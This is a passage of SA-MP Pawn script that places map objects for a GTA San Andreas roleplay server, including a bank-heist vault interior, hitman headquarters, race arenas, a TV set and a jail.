	CreateDynamicObject(1413,1915.1999512,-2042.5000000,13.8000002,0.0000000,0.0000000,0.0000000); //object(dyn_mesh_3) (3)
	CreateDynamicObject(1413,1900.5999756,-2042.6999512,13.8000002,0.0000000,0.0000000,0.0000000); //object(dyn_mesh_3) (5)
	CreateDynamicObject(1413,1895.8000488,-2041.1999512,13.8000002,0.0000000,0.0000000,326.0000000); //object(dyn_mesh_3) (6)
	CreateDynamicObject(1413,1869.5000000,-2042.9000244,13.8000002,0.0000000,0.0000000,0.0000000); //object(dyn_mesh_3) (7)
	CreateDynamicObject(1413,1864.1999512,-2042.8000488,13.8000002,0.0000000,0.0000000,0.0000000); //object(dyn_mesh_3) (8)
	CreateDynamicObject(1413,1852.1999512,-2042.6999512,13.8000002,0.0000000,0.0000000,0.0000000); //object(dyn_mesh_3) (9)
	CreateDynamicObject(1413,1846.9000244,-2042.5999756,13.8000002,0.0000000,0.0000000,0.0000000); //object(dyn_mesh_3) (10)
	CreateDynamicObject(1413,1843.5999756,-2040.0000000,13.8000002,0.0000000,0.0000000,280.2500000); //object(dyn_mesh_3) (11)
	CreateDynamicObject(3119,1887.0000000,-2015.9000244,12.8000002,0.0000000,0.0000000,0.0000000); //object(cs_ry_props) (2)
	CreateDynamicObject(1440,1905.4000244,-2026.1999512,13.1000004,0.0000000,0.0000000,0.0000000); //object(dyn_box_pile_3) (3)
	CreateDynamicObject(1440,1879.8000488,-2004.3000488,13.1000004,0.0000000,0.0000000,0.0000000); //object(dyn_box_pile_3) (4)

#if SISTEMA_BANCO == true

	//                                  BODEGA BANCO                //
	CreateDynamicObject(2634,2144.1999512,1627.1999512,994.2999878,0.0000000,0.0000000,180.0000000); //puertabobedacerrada

	CreateDynamic3DTextLabel("puertabobedacerrada", C_BLANCO, 2144.1999512,1627.1999512,994.2999878, 5.0);

	CreateDynamicObject(1550,2142.1999512,1641.3000488,993.0000000,0.0000000,0.0000000,0.0000000); //object(cj_money_bag) (1)
	CreateDynamicObject(1550,2142.8999023,1641.4000244,993.0000000,0.0000000,0.0000000,0.0000000); //object(cj_money_bag) (2)
	CreateDynamicObject(1550,2143.6000977,1641.5000000,993.0000000,0.0000000,0.0000000,0.0000000); //object(cj_money_bag) (3)
	CreateDynamicObject(1550,2144.3000488,1641.5999756,993.0000000,0.0000000,0.0000000,0.0000000); //object(cj_money_bag) (4)
	CreateDynamicObject(1550,2144.5000000,1640.5999756,993.0000000,0.0000000,0.0000000,0.0000000); //object(cj_money_bag) (5)
	CreateDynamicObject(1550,2144.0000000,1640.5000000,993.0000000,0.0000000,0.0000000,0.0000000); //object(cj_money_bag) (6)
	CreateDynamicObject(1550,2143.0000000,1640.3000488,993.0000000,0.0000000,0.0000000,0.0000000); //object(cj_money_bag) (7)
	CreateDynamicObject(1550,2142.0000000,1640.0999756,993.0000000,0.0000000,0.0000000,0.0000000); //object(cj_money_bag) (8)
	CreateDynamicObject(1550,2142.1999512,1639.0999756,993.0000000,0.0000000,0.0000000,0.0000000); //object(cj_money_bag) (9)
	CreateDynamicObject(1550,2142.8999023,1639.1999512,993.0000000,0.0000000,0.0000000,0.0000000); //object(cj_money_bag) (10)
	CreateDynamicObject(1550,2143.6000977,1639.3000488,993.0000000,0.0000000,0.0000000,0.0000000); //object(cj_money_bag) (11)
	CreateDynamicObject(1550,2144.3000488,1639.4000244,993.0000000,0.0000000,0.0000000,0.0000000); //object(cj_money_bag) (12)
	CreateDynamicObject(1616,2147.5000000,1639.3000488,996.7000122,0.0000000,0.0000000,0.0000000); //object(nt_securecam1_01) (1)
	CreateDynamicObject(1616,2144.1999512,1627.5999756,996.7000122,0.0000000,0.0000000,270.0000000); //object(nt_securecam1_01) (2)
	CreateDynamicObject(1616,2140.6999512,1631.8000488,996.7000122,0.0000000,0.0000000,256.0000000); //object(nt_securecam1_01) (3)
	CreateDynamicObject(2634,2173.3999023,1601.5999756,1000.4000244,0.0000000,0.0000000,90.0000000); //asd

	CreateDynamic3DTextLabel("asd", C_BLANCO, 2173.3999023,1601.5999756,1000.4000244, 5.0);

	CreateDynamicObject(1318,2168.5000000,1596.0000000,1000.0000000,0.0000000,0.0000000,0.0000000); ///cortarluz/volverluz

	CreateDynamic3DTextLabel("/cortarluz/volverluz", C_BLANCO, 2168.5000000,1596.0000000,1000.0000000, 5.0);

	CreateDynamicObject(1318,2161.0000000,1602.5000000,999.7999878,0.0000000,0.0000000,0.0000000); ///dinamitarpuerta

	CreateDynamic3DTextLabel("/dinamitarpuerta", C_BLANCO, 2161.0000000,1602.5000000,999.7999878, 5.0);

	CreateDynamicObject(3113,2156.1000977,1616.4000244,1002.7999878,0.0000000,14.0000000,270.0000000); //object(carrier_door_sfse) (1)
	CreateDynamicObject(2951,2146.1000977,1603.9000244,1001.0000000,0.0000000,0.0000000,270.0000000); //object(a51_labdoor) (1)
	CreateDynamicObject(2951,2148.3999023,1604.8000488,1001.0000000,0.0000000,0.0000000,180.0000000); //object(a51_labdoor) (2)
	CreateDynamicObject(2951,2143.0000000,1606.8000488,993.5000000,0.0000000,270.0000000,179.9945068); //puerta2cerrada

	CreateDynamic3DTextLabel("/puerta2cerrada", C_BLANCO, 2143.0000000,1606.8000488,993.5000000, 5.0);

	CreateDynamicObject(2951,2143.0000000,1606.8000488,988.7999878,0.0000000,270.0000000,179.9945068); //puerta2abierta

	CreateDynamic3DTextLabel("/puerta2abierta", C_BLANCO, 2143.0000000,1606.8000488,988.7999878, 5.0);

	CreateDynamicObject(2922,2145.8000488,1606.5000000,993.5999756,0.0000000,0.0000000,180.0000000); //object(kmb_keypad) (1)
	CreateDynamicObject(1318,2145.8000488,1606.3000488,993.2000122,0.0000000,0.0000000,0.0000000); ///hackearcontraseña

	CreateDynamic3DTextLabel("/hackearcontraseña", C_BLANCO, 2145.8000488,1606.3000488,993.2000122, 5.0);

	CreateDynamicObject(1318,2144.1999512,1625.9000244,993.7999878,0.0000000,0.0000000,90.0000000); //bobedaafuera/detonacion

	CreateDynamic3DTextLabel("/bobedaafuera/detonacion", C_BLANCO, 2144.1999512,1625.9000244,993.7999878, 5.0);

	CreateDynamicObject(2634,2144.1999512,1627.1999512,990.5999756,0.0000000,0.0000000,179.9945068); //puertabobedaabierta

	CreateDynamic3DTextLabel("/puertabobedaabierta", C_BLANCO, 2144.1999512,1627.1999512,990.5999756, 5.0);

	CreateDynamicObject(1318,2144.1000977,1638.1999512,993.0999756,0.0000000,0.0000000,0.0000000); ///recogerdinero

	CreateDynamic3DTextLabel("/recogerdinero", C_BLANCO,2144.1000977,1638.1999512,993.0999756, 5.0);

	CreateDynamicObject(1616,2144.6999512,1626.5000000,996.7000122,0.0000000,0.0000000,95.9979248); //object(nt_securecam1_01) (4)
	CreateDynamicObject(1616,2145.6999512,1606.4000244,996.0000000,0.0000000,0.0000000,95.9930420); //object(nt_securecam1_01) (5)
	CreateDynamicObject(1616,2149.3999023,1604.3000488,1000.5000000,0.0000000,0.0000000,95.9930420); //object(nt_securecam1_01) (6)
	CreateDynamicObject(1616,2146.3000488,1603.8000488,1004.5000000,0.0000000,0.0000000,207.9930420); //object(nt_securecam1_01) (7)
	CreateDynamicObject(1318,2172.0000000,1601.5999756,999.7999878,0.0000000,0.0000000,0.0000000); //primeraentrada

	OBJ_PuertaBanco = CreateDynamicObject(5422,2160.5000000,1601.9000244,1001.0000000,0.0000000,0.0000000,0.0000000); //puertacerrada1

#endif

	//                                  HITMAN EXT                  //
	CreateDynamicObject(2946,283.2999878,-1510.6999512,23.8999996,0.0000000,0.0000000,325.5000000); //object(cr_door_03) (3)
	CreateDynamicObject(2946,285.0996094,-1508.0996094,23.8999996,0.0000000,0.0000000,145.4919434); //object(cr_door_03) (4)
	CreateDynamicObject(3934,321.6000061,-1507.3000488,75.5999985,0.0000000,0.0000000,0.0000000); //object(helipad01) (1)

	//                                  HITMAN INT                  //
	CreateDynamicObject_e(2946,369.0000000,161.5000000,1013.0999756,0.0000000,0.0000000,0.0000000); //object(cr_door_03) (1)
	CreateDynamicObject_e(2946,369.0000000,161.5000000,1015.5000000,0.0000000,0.0000000,0.0000000); //object(cr_door_03) (2)
	CreateDynamicObject_e(18610,341.1000061,173.5000000,1014.9000244,0.0000000,0.0000000,0.0000000); //object(cs_landbit_70_a) (1)
	CreateDynamicObject_e(18610,341.1000061,173.5000000,1018.2999878,0.0000000,0.0000000,0.0000000); //object(cs_landbit_70_a) (2)
	CreateDynamicObject_e(18629,341.1000061,179.1000061,1014.9000244,0.0000000,0.0000000,0.0000000); //object(cs_landbit_06_a) (1)
	CreateDynamicObject_e(18629,341.1000061,179.1000061,1018.2999878,0.0000000,0.0000000,0.0000000); //object(cs_landbit_06_a) (2)
	CreateDynamicObject_e(18610,363.0000000,179.1000061,1014.9000244,0.0000000,0.0000000,270.0000000); //object(cs_landbit_70_a) (3)
	CreateDynamicObject_e(18610,363.0000000,179.1000061,1018.2999878,0.0000000,0.0000000,270.0000000); //object(cs_landbit_70_a) (4)
	CreateDynamicObject_e(18610,341.0000000,153.5000000,1014.9000244,0.0000000,0.0000000,0.0000000); //object(cs_landbit_70_a) (5)
	CreateDynamicObject_e(18610,341.0000000,153.5000000,1018.4000244,0.0000000,0.0000000,0.0000000); //object(cs_landbit_70_a) (6)
	CreateDynamicObject_e(18610,332.7999878,172.6999969,1014.9000244,0.0000000,0.0000000,0.0000000); //object(cs_landbit_70_a) (8)
	CreateDynamicObject_e(18610,332.7999878,172.6999969,1018.2999878,0.0000000,0.0000000,0.0000000); //object(cs_landbit_70_a) (9)
	CreateDynamicObject_e(13615,334.8999939,165.3000031,1015.0999756,0.0000000,0.0000000,0.0000000); //object(thebowl10) (1)
	CreateDynamicObject_e(13614,334.8999939,165.3000031,1015.0999756,0.0000000,0.0000000,0.0000000); //object(thebowl12) (1)
	CreateDynamicObject_e(1502,332.7999878,179.0000000,1013.2000122,0.0000000,0.0000000,270.0000000); //object(gen_doorint04) (1)
	CreateDynamicObject_e(18610,332.7999878,182.3000031,1017.2999878,0.0000000,0.0000000,0.0000000); //object(cs_landbit_70_a) (10)
	CreateDynamicObject_e(2843,327.8999939,170.5000000,1013.2000122,0.0000000,0.0000000,0.0000000); //object(gb_bedclothes02) (1)
	CreateDynamicObject_e(2844,329.2999878,169.6000061,1013.2000122,0.0000000,0.0000000,0.0000000); //object(gb_bedclothes03) (1)
	CreateDynamicObject_e(2845,330.8999939,169.8999939,1013.2000122,0.0000000,0.0000000,0.0000000); //object(gb_bedclothes04) (1)
	CreateDynamicObject_e(2846,329.3999939,171.0000000,1013.2000122,0.0000000,0.0000000,0.0000000); //object(gb_bedclothes05) (1)
	CreateDynamicObject_e(2032,327.5000000,169.8000031,1013.2000122,0.0000000,0.0000000,0.0000000); //object(med_dinning_2) (1)
	CreateDynamicObject_e(1753,337.2999878,186.1000061,1013.2000122,0.0000000,0.0000000,0.0000000); //object(swank_couch_1) (1)
	CreateDynamicObject_e(1753,352.8999939,178.5000000,1013.2000122,0.0000000,0.0000000,0.0000000); //object(swank_couch_1) (2)
	CreateDynamicObject_e(1753,363.2000122,178.5000000,1013.2000122,0.0000000,0.0000000,0.0000000); //object(swank_couch_1) (3)
	CreateDynamicObject_e(1753,372.2999878,169.6999969,1013.2000122,0.0000000,0.0000000,180.0000000); //object(swank_couch_1) (4)
	CreateDynamicObject_e(2067,327.2000122,178.6999969,1013.2000122,0.0000000,0.0000000,0.0000000); //object(cj_m_fileing3) (1)
	CreateDynamicObject_e(2067,327.2000122,178.6999969,1014.5999756,0.0000000,0.0000000,0.0000000); //object(cj_m_fileing3) (2)
	CreateDynamicObject_e(2067,327.7000122,178.6999969,1013.2000122,0.0000000,0.0000000,0.0000000); //object(cj_m_fileing3) (3)
	CreateDynamicObject_e(2067,327.7000122,178.6999969,1014.5999756,0.0000000,0.0000000,0.0000000); //object(cj_m_fileing3) (4)
	CreateDynamicObject_e(2067,328.2000122,178.6999969,1014.5999756,0.0000000,0.0000000,0.0000000); //object(cj_m_fileing3) (5)
	CreateDynamicObject_e(2067,328.2000122,178.6999969,1013.2000122,0.0000000,0.0000000,0.0000000); //object(cj_m_fileing3) (6)
	CreateDynamicObject_e(2067,328.7000122,178.6999969,1013.2000122,0.0000000,0.0000000,0.0000000); //object(cj_m_fileing3) (7)
	CreateDynamicObject_e(2067,328.7000122,178.6999969,1014.5999756,0.0000000,0.0000000,0.0000000); //object(cj_m_fileing3) (8)
	CreateDynamicObject_e(2067,329.2000122,178.6999969,1013.2000122,0.0000000,0.0000000,0.0000000); //object(cj_m_fileing3) (9)
	CreateDynamicObject_e(2067,329.2000122,178.6999969,1014.5999756,0.0000000,0.0000000,0.0000000); //object(cj_m_fileing3) (10)
	CreateDynamicObject_e(2846,331.2000122,172.6999969,1013.2000122,0.0000000,0.0000000,0.0000000); //object(gb_bedclothes05) (2)
	CreateDynamicObject_e(2845,327.3999939,172.0000000,1013.2000122,0.0000000,0.0000000,0.0000000); //object(gb_bedclothes04) (2)
	CreateDynamicObject_e(2167,330.0000000,179.0000000,1013.2000122,0.0000000,0.0000000,0.0000000); //object(med_office_unit_7) (1)
	CreateDynamicObject_e(3077,328.2000122,150.3999939,1013.2000122,0.0000000,0.0000000,0.0000000); //object(nf_blackboard) (1)
	CreateDynamicObject_e(1622,367.7000122,164.5000000,1016.2000122,0.0000000,0.0000000,0.0000000); //object(nt_securecam2_01) (1)
	CreateDynamicObject_e(1622,361.7000122,163.0000000,1016.2000122,0.0000000,0.0000000,160.0000000); //object(nt_securecam2_01) (2)
	CreateDynamicObject_e(2375,327.2999878,176.1000061,1013.2000122,0.0000000,0.0000000,270.0000000); //object(shop_set_2_unit1) (1)
	CreateDynamicObject_e(2167,330.8999939,179.0000000,1013.2000122,0.0000000,0.0000000,0.0000000); //object(med_office_unit_7) (2)
	CreateDynamicObject_e(2167,330.8999939,179.0000000,1014.7000122,0.0000000,0.0000000,0.0000000); //object(med_office_unit_7) (3)
	CreateDynamicObject_e(2167,330.0000000,179.0000000,1014.7000122,0.0000000,0.0000000,0.0000000); //object(med_office_unit_7) (4)
	CreateDynamicObject_e(14651,354.5000000,171.1999969,1015.4000244,0.0000000,0.0000000,0.0000000); //object(trukstp05) (1)
	CreateDynamicObject_e(14651,358.5000000,171.3000031,1015.4000244,0.0000000,0.0000000,0.0000000); //object(trukstp05) (2)
	CreateDynamicObject_e(16151,342.2999878,173.5000000,1013.5000000,0.0000000,0.0000000,180.0000000); //object(ufo_bar) (1)
	CreateDynamicObject_e(1808,333.2999878,168.6000061,1013.2000122,0.0000000,0.0000000,0.0000000); //object(cj_watercooler2) (1)
	CreateDynamicObject_e(18629,332.8999939,184.1999969,1014.9000244,0.0000000,0.0000000,0.0000000); //object(cs_landbit_06_a) (3)
	CreateDynamicObject_e(2100,348.7000122,169.5000000,1013.2000122,0.0000000,0.0000000,130.0000000); //object(med_hi_fi_2) (1)
	CreateDynamicObject_e(2231,356.2000122,179.3999939,1015.5999756,0.0000000,0.0000000,0.0000000); //object(swank_speaker_3) (1)
	CreateDynamicObject_e(2231,374.2000122,175.3999939,1015.5999756,0.0000000,0.0000000,270.0000000); //object(swank_speaker_3) (2)
	CreateDynamicObject_e(2332,337.2999878,152.1999969,1015.2000122,0.0000000,0.0000000,179.9945068); //object(kev_safe) (1)
	CreateDynamicObject_e(2332,337.2999878,152.1999969,1014.4000244,0.0000000,0.0000000,179.9945068); //object(kev_safe) (2)
	CreateDynamicObject_e(2332,337.2999878,152.1999969,1013.5999756,0.0000000,0.0000000,179.9945068); //object(kev_safe) (3)
	CreateDynamicObject_e(2628,334.6000061,184.6999969,1013.2000122,0.0000000,0.0000000,0.0000000); //object(gym_bench2) (1)
	CreateDynamicObject_e(2630,336.7000122,182.5000000,1013.2000122,0.0000000,0.0000000,0.0000000); //object(gym_bike) (1)
	CreateDynamicObject_e(2630,337.8999939,182.3999939,1013.2000122,0.0000000,0.0000000,0.0000000); //object(gym_bike) (2)
	CreateDynamicObject_e(2630,339.1000061,182.3000031,1013.2000122,0.0000000,0.0000000,0.0000000); //object(gym_bike) (3)
	CreateDynamicObject_e(1723,327.5000000,152.8999939,1013.2000122,0.0000000,0.0000000,0.0000000); //object(mrk_seating1) (1)
	CreateDynamicObject_e(1723,327.5000000,155.3999939,1013.2000122,0.0000000,0.0000000,0.0000000); //object(mrk_seating1) (2)

	//                                  MotoCross                   //
	CreateDynamicObject(19381, -1372.65, 1650.95, 1051.57,   0.00, 90.00, 0.00);
	CreateDynamicObject(18070, -1372.61, 1653.12, 1052.18,   0.00, 0.00, 0.00);
	CreateDynamicObject(1663, -1372.58, 1652.79, 1052.26,   0.00, 0.00, 0.00);
	CreateDynamicObject(983, -1372.34, 1646.14, 1053.63,   0.00, 0.00, 90.00);
	CreateDynamicObject(983, -1367.38, 1649.32, 1052.37,   0.00, 0.00, 0.00);
	CreateDynamicObject(983, -1367.39, 1655.71, 1052.37,   0.00, 0.00, 0.00);
	CreateDynamicObject(983, -1377.86, 1649.34, 1052.37,   0.00, 0.00, 0.00);
	CreateDynamicObject(983, -1377.87, 1655.73, 1052.37,   0.00, 0.00, 0.00);
	CreateDynamicObject(983, -1372.34, 1646.14, 1052.37,   0.00, 0.00, 90.00);
	CreateDynamicObject(983, -1367.41, 1649.32, 1053.63,   0.00, 0.00, 0.00);
	CreateDynamicObject(983, -1367.39, 1655.71, 1053.63,   0.00, 0.00, 0.00);
	CreateDynamicObject(983, -1377.87, 1655.73, 1053.63,   0.00, 0.00, 0.00);
	CreateDynamicObject(983, -1377.86, 1649.34, 1053.65,   0.00, 0.00, 0.00);
	CreateDynamicObject(1663, -1377.43, 1649.66, 1052.26,   0.00, 0.00, 87.84);
	CreateDynamicObject(1663, -1377.45, 1649.08, 1052.26,   0.00, 0.00, 87.84);
	CreateDynamicObject(1663, -1377.47, 1648.56, 1052.26,   0.00, 0.00, 87.84);
	CreateDynamicObject(1429, -1375.25, 1651.70, 1053.01,   0.00, 0.00, -39.90);
	CreateDynamicObject(2190, -1372.10, 1650.76, 1052.95,   0.00, 0.00, 186.18);
	CreateDynamicObject(2894, -1373.25, 1651.50, 1052.69,   0.00, 0.00, 0.00);
	CreateDynamicObject(13592, -1410.33, 1639.18, 1061.24,   0.00, 0.00, 0.00);

	//                              Crash-Arena                     //
	CreateDynamicObject(18070, -1363.08, 929.76, 1035.94,   0.00, 0.00, 181.02);
	CreateDynamicObject(19381, -1362.86, 931.78, 1035.31,   0.00, 90.00, 2.34);
	CreateDynamicObject(19381, -1362.82, 931.81, 1035.41,   0.00, 90.00, 2.34);
	CreateDynamicObject(1663, -1362.92, 930.42, 1036.22,   0.00, 0.00, 177.84);
	CreateDynamicObject(2894, -1364.07, 931.47, 1036.46,   0.00, 0.00, 0.00);
	CreateDynamicObject(1429, -1360.83, 931.19, 1036.70,   0.00, 0.00, 162.24);
	CreateDynamicObject(983, -1357.74, 933.57, 1036.19,   0.00, 0.00, 1.92);
	CreateDynamicObject(983, -1357.52, 927.16, 1036.19,   0.00, 0.00, 1.92);
	CreateDynamicObject(983, -1363.20, 936.51, 1036.19,   0.00, 0.00, 92.40);
	CreateDynamicObject(983, -1368.15, 933.19, 1036.19,   0.00, 0.00, 1.92);
	CreateDynamicObject(983, -1367.92, 926.79, 1036.19,   0.00, 0.00, 1.92);
	CreateDynamicObject(1663, -1358.15, 933.56, 1036.22,   0.00, 0.00, 271.08);
	CreateDynamicObject(1663, -1358.18, 934.16, 1036.22,   0.00, 0.00, 271.08);
	CreateDynamicObject(1663, -1358.20, 934.76, 1036.22,   0.00, 0.00, 271.08);
	CreateDynamicObject(19172, -1368.18, 930.88, 1038.15,   0.00, 0.00, 450.12);

	//                                  RALLY                       //
	CreateDynamicObject(19381, -1424.68, -663.66, 1064.52,   0.00, 90.00, 87.72);
	CreateDynamicObject(19379, -1424.95, -669.09, 1063.26,   0.00, 0.00, 88.61);
	CreateDynamicObject(19379, -1424.48, -658.20, 1063.25,   0.00, 0.00, 88.43);
	CreateDynamicObject(18070, -1424.50, -660.97, 1065.01,   0.00, 0.00, -2.10);
	CreateDynamicObject(1429, -1426.93, -662.57, 1065.75,   0.00, 0.00, -14.16);
	CreateDynamicObject(2894, -1423.89, -662.80, 1065.52,   0.00, 0.00, 0.00);
	CreateDynamicObject(1663, -1424.28, -660.25, 1065.05,   0.00, 0.00, 0.00);
	CreateDynamicObject(1663, -1429.17, -667.43, 1065.03,   0.00, 0.00, 84.18);
	CreateDynamicObject(1663, -1429.13, -666.86, 1065.03,   0.00, 0.00, 84.18);
	CreateDynamicObject(1663, -1429.11, -666.31, 1065.03,   0.00, 0.00, 84.18);
	CreateDynamicObject(3851, -1429.46, -663.47, 1066.46,   0.00, 0.00, -2.28);
	CreateDynamicObject(3851, -1419.93, -663.73, 1066.46,   0.00, 0.00, -2.28);

	//                                  TC-2000                     //
	CreateDynamicObject(19381, -1404.36, -256.41, 1042.65,   0.00, 90.00, -7.92);
	CreateDynamicObject(19381, -1404.89, -260.01, 1042.64,   0.00, 90.00, -7.92);
	CreateDynamicObject(18070, -1405.41, -259.92, 1043.13,   0.00, 0.00, 166.26);
	CreateDynamicObject(1663, -1405.44, -259.72, 1043.27,   0.00, 0.00, 165.66);
	CreateDynamicObject(2894, -1405.21, -258.06, 1043.63,   0.00, 0.00, 0.00);
	CreateDynamicObject(1429, -1402.74, -258.72, 1043.88,   0.00, 0.00, 144.66);
	CreateDynamicObject(3851, -1399.39, -257.96, 1044.57,   0.00, 0.00, -8.88);
	CreateDynamicObject(3851, -1404.11, -251.60, 1044.57,   0.00, 0.00, -97.86);
	CreateDynamicObject(1663, -1399.55, -256.37, 1043.27,   0.00, 0.00, 258.06);
	CreateDynamicObject(1663, -1399.44, -255.81, 1043.27,   0.00, 0.00, 258.84);
	CreateDynamicObject(1663, -1399.33, -255.26, 1043.27,   0.00, 0.00, 259.26);

	//                                  TV                     		//
	CreateDynamicObject(19462, -158.66, -300.36, 1048.40,   0.00, 90.00, 0.00);
	CreateDynamicObject(19462, -155.21, -300.33, 1048.40,   0.00, 90.00, 0.00);
	CreateDynamicObject(19462, -151.72, -300.33, 1048.40,   0.00, 90.00, 0.00);
	CreateDynamicObject(19462, -148.24, -300.34, 1048.40,   0.00, 90.00, 0.00);
	CreateDynamicObject(19462, -148.24, -290.72, 1048.40,   0.00, 90.00, 0.00);
	CreateDynamicObject(19462, -151.72, -290.71, 1048.40,   0.00, 90.00, 0.00);
	CreateDynamicObject(19462, -155.22, -290.70, 1048.40,   0.00, 90.00, 0.00);
	CreateDynamicObject(19462, -158.71, -290.72, 1048.40,   0.00, 90.00, 0.00);
	CreateDynamicObject(19358, -158.75, -305.06, 1050.20,   0.00, 0.00, 90.62);
	CreateDynamicObject(19404, -155.55, -305.02, 1050.20,   0.00, 0.00, 90.84);
	CreateDynamicObject(19404, -152.35, -304.97, 1050.20,   0.00, 0.00, 90.84);
	CreateDynamicObject(19358, -149.15, -304.94, 1050.20,   0.00, 0.00, 90.62);
	CreateDynamicObject(19450, -147.53, -300.04, 1050.20,   0.00, 0.00, 0.00);
	CreateDynamicObject(19450, -147.50, -287.21, 1050.20,   0.00, 0.00, 0.00);
	CreateDynamicObject(19404, -147.50, -293.64, 1050.20,   0.00, 0.00, 0.00);
	CreateDynamicObject(19450, -160.25, -300.17, 1050.20,   0.00, 0.00, 0.00);
	CreateDynamicObject(19404, -160.25, -293.76, 1050.20,   0.00, 0.00, 0.00);
	CreateDynamicObject(19450, -160.25, -287.37, 1050.20,   0.00, 0.00, 0.00);
	CreateDynamicObject(19388, -152.36, -286.15, 1050.20,   0.00, 0.00, 90.00);
	CreateDynamicObject(19358, -149.16, -286.13, 1050.20,   0.00, 0.00, 90.62);
	CreateDynamicObject(19358, -155.54, -286.16, 1050.20,   0.00, 0.00, 90.62);
	CreateDynamicObject(19358, -158.75, -286.20, 1050.20,   0.00, 0.00, 90.62);
	CreateDynamicObject(1649, -160.21, -294.43, 1049.80,   0.00, 0.00, 89.76);
	CreateDynamicObject(1649, -147.40, -294.07, 1049.80,   0.00, 0.00, 271.56);
	CreateDynamicObject(1649, -152.22, -305.01, 1049.80,   0.00, 0.00, 180.60);
	CreateDynamicObject(1649, -155.92, -305.05, 1049.80,   0.00, 0.00, 180.60);
	CreateDynamicObject(1536, -153.14, -286.18, 1048.50,   0.00, 0.00, 0.00);
	CreateDynamicObject(19454, -158.58, -300.30, 1051.88,   0.00, 90.00, 0.00);
	CreateDynamicObject(19454, -155.08, -300.29, 1051.88,   0.00, 90.00, 0.00);
	CreateDynamicObject(19454, -151.60, -300.28, 1051.88,   0.00, 90.00, 0.00);
	CreateDynamicObject(19454, -148.11, -300.26, 1051.88,   0.00, 90.00, 0.00);
	CreateDynamicObject(19454, -158.57, -290.68, 1051.88,   0.00, 90.00, 0.00);
	CreateDynamicObject(19454, -155.07, -290.66, 1051.88,   0.00, 90.00, 0.00);
	CreateDynamicObject(19454, -151.61, -290.70, 1051.88,   0.00, 90.00, 0.00);
	CreateDynamicObject(19454, -148.10, -290.62, 1051.88,   0.00, 90.00, 0.00);
	CreateDynamicObject(18070, -153.78, -301.35, 1048.83,   0.00, 0.00, 180.81);
	CreateDynamicObject(1714, -154.94, -301.34, 1048.47,   0.00, 0.00, 176.56);
	CreateDynamicObject(1714, -153.74, -301.28, 1048.47,   0.00, 0.00, 176.56);
	CreateDynamicObject(1714, -152.51, -301.28, 1048.47,   0.00, 0.00, 187.18);
	CreateDynamicObject(1429, -150.99, -305.01, 1050.16,   0.00, 0.00, 179.94);
	CreateDynamicObject(1429, -150.99, -305.01, 1050.67,   0.00, 0.00, 179.94);
	CreateDynamicObject(1429, -153.97, -305.07, 1050.57,   0.00, 0.00, 179.94);
	CreateDynamicObject(1429, -156.97, -305.07, 1050.16,   0.00, 0.00, 179.94);
	CreateDynamicObject(1429, -156.97, -305.07, 1050.67,   0.00, 0.00, 179.94);
	CreateDynamicObject(2894, -155.36, -299.65, 1049.33,   0.00, 0.00, 0.00);
	CreateDynamicObject(2894, -152.64, -299.63, 1049.33,   0.00, 0.00, 0.00);
	CreateDynamicObject(19172, -147.65, -297.35, 1050.71,   0.00, 0.00, 270.00);
	CreateDynamicObject(19173, -160.08, -297.13, 1050.49,   0.00, 0.00, 449.76);
	CreateDynamicObject(2230, -160.19, -298.66, 1048.36,   0.00, 0.00, 115.50);
	CreateDynamicObject(2230, -160.20, -297.65, 1048.36,   0.00, 0.00, 115.50);
	CreateDynamicObject(2230, -148.17, -299.62, 1048.36,   0.00, 0.00, 223.50);
	CreateDynamicObject(2230, -148.12, -298.80, 1048.36,   0.00, 0.00, 223.50);

	//                              PAYNSPRAY                       //
	CreateDynamicObject(19377, -1935.108642, 239.225875, 34.156250, 0.000000, 0.000000, -89.799949);
	CreateDynamicObject(19377, -2716.319335, 218.202224, 4.179687, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(19377, 2644.124023, -2039.189941, 11.234062, -1.500021, -0.200000, 89.999984);
	CreateDynamicObject(19377, 1042.862182, -1025.971435, 31.875671, 0.000000, 0.000000, 89.899963);
	CreateDynamicObject(19377, 2386.671630, 1043.633056, 10.820312, 0.000000, 0.000000, 90.000007);
	CreateDynamicObject(19377, 1843.502197, -1854.967407, 10.409748, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(19377, 2005.242919, 2303.465087, 10.820312, 0.000000, 0.000000, 89.700050);
	CreateDynamicObject(19377, -1787.482666, 1209.508178, 25.125000, 0.000000, 0.000000, 90.099983);
	CreateDynamicObject(19377, 720.046875, -462.469024, 15.903699, 0.000000, 0.000000, 90.000030);
	CreateDynamicObject(19377, -1421.173217, 2590.981445, 55.227497, 0.000000, 0.000000, 89.000038);
	CreateDynamicObject(19377, -99.606025, 1111.586425, 19.343750, 0.000000, 0.000000, 90.199989);
	CreateDynamicObject(19377, 2071.529052, -1830.954345, 13.142802, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(19377, -2425.913574, 1028.063232, 50.390625, 0.000000, 0.000000, 91.200019);
	CreateDynamicObject(19377, 1968.285766, 2162.526123, 10.820312, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(19377, 489.340393, -1735.311645, 11.308824, 0.000000, 0.000000, -101.899993);
	CreateDynamicObject(19377, 1025.891601, -1029.417236, 30.736160, 0.000000, 0.000000, -90.099983);
	CreateDynamicObject(19377, 2393.932617, 1483.681274, 10.671875, 0.000000, 0.000000, 90.000030);
	CreateDynamicObject(19377, -1905.037719, 277.640899, 41.039070, 0.000000, 0.000000, 88.499977);

	//                              CARCEL BY NATHAN                //
	CreateDynamicObject(1508,2577.0000000,7590.0000000,-1305.0000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1508,2577.7700000,-1305.6400000,1037.8700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.3600000,-1314.6400000,1034.3900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.3600000,-1314.6400000,1033.1100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.3600000,-1314.6400000,1031.9500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2555.2700000,-1317.9800000,1032.3900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.3400000,-1314.6400000,1030.6500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.2300000,-1314.6600000,1030.6500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.2300000,-1314.6600000,1031.9300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.2200000,-1314.6600000,1033.1900000,0.0000000,0.0000000,0.0000000); //
